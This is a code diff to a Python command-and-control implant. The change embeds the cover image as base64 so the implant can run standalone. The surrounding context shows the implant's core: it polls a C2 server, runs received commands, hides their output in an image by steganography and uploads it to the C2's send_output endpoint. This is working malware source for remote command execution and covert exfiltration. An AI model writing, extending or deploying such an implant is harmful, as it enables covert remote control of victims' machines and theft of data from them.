@@ -7,12 +7,15 @@ import subprocess
 import sys
 from PIL import Image
 import io
+import base64
 
 # --- Implant Configuration ---
 C2_URL = "http://{C2_HOST}:{C2_PORT}"
 POLL_INTERVAL = 10 # in seconds
 OUTPUT_IMAGE = '/tmp/stego_implant_output.png'
-INPUT_IMAGE = 'assets/input.png'
+
+# --- Embedded Assets ---
+INPUT_IMAGE_DATA = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=')
 
 # --- Add Project Root to Path ---
 def find_project_root(start_path):
@@ -31,10 +34,9 @@ if project_root:
     from modules.steganography import encode_image, decode_image
 else:
     # --- Fallback Steganography Functions ---
-    def encode_image(image_path, text, output_path):
+    def encode_image(image_data, text, output_path):
         # This is a simplified version for the standalone implant.
-        # It assumes the input image exists and the text is not too long.
-        img = Image.open(image_path)
+        img = Image.open(io.BytesIO(image_data))
         encoded = img.copy()
         width, height = img.size
         index = 0
@@ -95,7 +97,7 @@ def run_implant(c2_host, c2_port):
                 output = execute_command(command)
 
                 # Encode and send output
-                encode_image(INPUT_IMAGE, output, OUTPUT_IMAGE)
+                encode_image(INPUT_IMAGE_DATA, output, OUTPUT_IMAGE)
                 with open(OUTPUT_IMAGE, 'rb') as f:
                     files = {'file': f}
                     requests.post(f"{c2_full_url}/implant/send_output", files=files)
